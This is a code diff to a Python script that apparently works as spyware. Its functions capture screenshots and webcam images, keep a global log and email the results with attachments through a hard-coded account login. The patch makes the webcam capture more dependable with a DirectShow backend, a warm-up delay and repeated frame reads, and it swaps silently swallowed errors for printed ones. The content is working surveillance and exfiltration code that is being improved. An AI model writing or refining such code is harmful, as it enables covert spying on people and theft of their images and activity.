@@ -7,6 +7,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import time
 
 # ========================
 # CONFIGURATION
@@ -64,14 +65,16 @@ def capture_screenshot():
 
 def capture_webcam():
     try:
-        cam = cv2.VideoCapture(0)
-        ret, frame = cam.read()
+        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        time.sleep(1.5)
+        for _ in range(5):
+            ret, frame = cam.read()
         if ret:
             cv2.imwrite(WC_FILE, frame)
         cam.release()
         cv2.destroyAllWindows()
-    except:
-        pass
+    except Exception as e:
+        print(f"[Webcam Error] {e}")
 
 def send_email(data, attachments=[]):
     try:
@@ -95,8 +98,8 @@ def send_email(data, attachments=[]):
         server.login(EMAIL, PASSWORD)
         server.send_message(msg)
         server.quit()
-    except:
-        pass
+    except Exception as e:
+        print(f"[Email Error] {e}")
 
 def report():
     global log
